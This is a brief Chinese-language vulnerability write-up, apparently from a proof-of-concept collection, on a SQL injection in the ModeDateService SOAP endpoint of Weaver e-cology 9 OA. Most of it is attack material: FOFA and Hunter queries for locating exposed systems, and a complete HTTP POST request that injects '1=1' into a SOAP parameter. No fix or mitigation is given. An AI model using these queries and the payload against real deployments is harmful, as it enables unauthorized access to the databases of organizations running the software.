# 泛微ecology9系统接口ModeDateService存在SQL漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology9系统ModeDateService存在SQL注入漏洞。

## fofa

```yaml
app="泛微-协同商务系统"
```

## hunter

```yaml
app.name=="泛微 e-cology 9.0 OA"
```

## poc

```java
POST /services/ModeDateService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx//services/Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaasJ-HspHcxI5r2Krufz; JSESSIONID=aaasJ-HspHcxI5r2Krufz
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xxx 
Content-Length: 405

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
   <soapenv:Header/>   
   <soapenv:Body>
      <mod:getAllModeDataCount>
		<mod:in0>1</mod:in0>         
		<mod:in1>1</mod:in1>         
		<mod:in2>1=1</mod:in2>         
		<mod:in3>1</mod:in3>
	  </mod:getAllModeDataCount>
  </soapenv:Body>
</soapenv:Envelope>
```

![image-20240822185856455](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408221858526.png)

![image-20240822185904629](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408221859693.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/2UkeRDbGaW0JGNQLfGSkRw